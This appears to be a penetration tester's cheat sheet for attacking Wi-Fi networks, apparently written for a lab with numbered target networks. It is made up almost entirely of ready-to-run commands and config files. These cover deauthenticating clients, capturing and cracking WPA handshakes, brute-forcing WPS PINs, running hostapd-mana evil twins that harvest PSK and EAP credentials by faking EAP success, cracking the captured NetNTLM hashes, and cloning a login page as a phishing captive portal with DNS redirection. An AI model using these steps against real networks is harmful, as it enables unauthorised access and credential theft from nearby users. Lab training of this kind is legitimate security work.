# Useful Wireshark Filter
0x08 means beacons
```wlan.fc.type_subtype == 0x08 && wlan.ssid == "<targetname>" ```

filter on bssid
```wlan.bssid == <bssid>```

# Capturing handshakes  

## Starting monitor mode  
```sudo airmon-ng start wlan0 ```

## Starting monitor mode and setting a channel  
```sudo airmon-ng start wlan0 3  ```

## Recon - see all  
```sudo airodump-ng wlan0mon```

## Recon specific (monitor channel 3)
```
sudo airmon-ng start wlan0 3
sudo airodump-ng --bssid <bssid> --essid <essid> wlan0mon -w <fileprefix> --channel <channel>
```
Then deauth from another shell or wifi card:
```sudo aireplay-ng -0 5 -a <BSSID> -c <client MAC> wlan0mon```

# Cracking handshakes

Default wordlists in Kali:  https://www.kali.org/tools/wordlists/

## Aircrack-ng
```aircrack-ng -w <path to wordlist> -e <ESSID> -b <BSSID> <capture filename>```

Aircrack with john rules
```sudo john --wordlist=<path to wordlist> --rules --stdout | aircrack-ng -e <ESSID> -b <BSSID> -w <capture filename>```

# Cracking wps

## Recon
```sudo wash -i wlan0mon ```

## Attacks
```sudo reaver -b <bssid> -i wlan0mon -v```

May need -K  
```sudo reaver -b <bssid> -i wlan0mon -v -K```

# Evil Twin with hostapd-mana
Wiki: https://github.com/sensepost/hostapd-mana/wiki

## PSK
```
interface=wlan0
ssid=groupB_target_3
channel=3
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
rsn_pairwise=CCMP
mana_wpaout=/home/kali/groupB_target_3.hccapx
```

Then crack with aircrack-ng

## EAP

/etc/hostapd-mana/mana.eap_user
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```


hostapd-mana config file
```# SSID of the AP
ssid=groupB_target_4

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/home/kali/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

Start evil twin with command
```
sudo hostapd-mana <configfile>
```

## Cracking hashes

Extract hashes:
```grep <JTR/HASHCAT> | cut -f2 >> <hashfile>```

Hashcat and John syntax
```
sudo hashcat -m 5500 <hashfile> <wordlist> 
john --format=netntlm <hashfile> --wordlist=<wordlist>
```

# Connecting to target network

wifi supplicant config file:

```
network={
  ssid="<ssid>"
  scan_ssid=1
  psk="<password>"
  key_mgmt=WPA-PSK
}
```
Then to connect (use the -B after verifying the connection is successful)
```
sudo wpa_supplicant -i <interface> -c <config file> -B 
sudo dhclient <interface>
```

# Captive Portals
```
sudo apt install apache2 libapache2-mod-php
wget -r -l2 <site to clone>
```

create index.php from wget, copy needed files to /var/www/html/portal

copy login_check.php to /var/www/html/portal

set up network
```sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
sudo apt install dnsmasq
```
create mco-dnsmasq.conf file and start dnsmasq
```
sudo dnsmasq --conf-file=mco-dnsmasq.conf
verify dns
sudo netstat -lnp
```

Install nftables if needed
```
sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
Update apache to use ssl
```
sudo a2enmod ssl
sudo systemctl restart apache2
```

start the evil twin with the mco-hostapd.conf file
```sudo hostapd -B mco-hostapd.conf```
